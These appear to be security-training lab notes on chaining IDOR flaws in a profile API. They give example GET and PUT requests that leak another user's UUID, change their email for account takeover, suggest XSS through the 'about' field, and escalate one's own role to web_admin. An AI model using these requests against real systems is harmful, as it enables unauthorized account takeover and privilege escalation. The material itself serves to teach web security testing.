# Chaining IDOR Vulnerabilities

When interacting with an API, a typical GET request to the endpoint `/profile/api.php` is expected to return user details. This request includes headers such as Host, User-Agent, and a cookie indicating the user's role (e.g., `role=employee`). Notably, this cookie is the only form of authorization present, lacking more secure methods like JWT tokens.

**Information Disclosure Vulnerability**

By sending a GET request with a different user ID (uid), we can retrieve details of another user, confirming an **Insecure Direct Object Reference (IDOR)** vulnerability. For example, a response might include:

{% code overflow="wrap" %}
```json
{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "i_franklyn@employees.htb",
    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
}
```
{% endcode %}

This response reveals sensitive information, including the user's UUID, which can be exploited further.

**Modifying User Details**

With the UUID obtained, we can send a PUT request to modify the user's details without encountering any access control errors. For instance:

```http
PUT /profile/api.php/profile/2
Content-Type: application/json

{
    "uid": "2",
    "uuid": "4a9bd19b3b8676199592a346051f950c",
    "role": "employee",
    "full_name": "Iona Franklyn",
    "email": "new_email@employees.htb",
    "about": "Updated about section."
}
```

Upon successful modification, a subsequent GET request confirms the changes.

**Potential Attacks**

The ability to modify user details opens the door to various attacks:

* **Account Takeover**: Changing a user's email and requesting a password reset can allow an attacker to gain control over the account.
* **Cross-Site Scripting (XSS)**: Inserting malicious scripts in fields like 'about' can lead to XSS attacks when the affected user visits their profile.

**Chaining IDOR Vulnerabilities**

Identifying an IDOR vulnerability allows for user enumeration, potentially revealing users with higher privileges, such as an admin. For example, an admin user might have the following details:

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

With this information, an attacker can modify the admin's details or elevate their own privileges by changing their role to `web_admin`.

**Elevating Privileges**

To change a user's role, an attacker can intercept the request when updating their profile and modify the role field:

```http
PUT /profile/api.php
Content-Type: application/json

{
    "uid": "1",
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "web_admin",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

If successful, the attacker can then create new users or delete existing ones by sending a POST request with the necessary details.
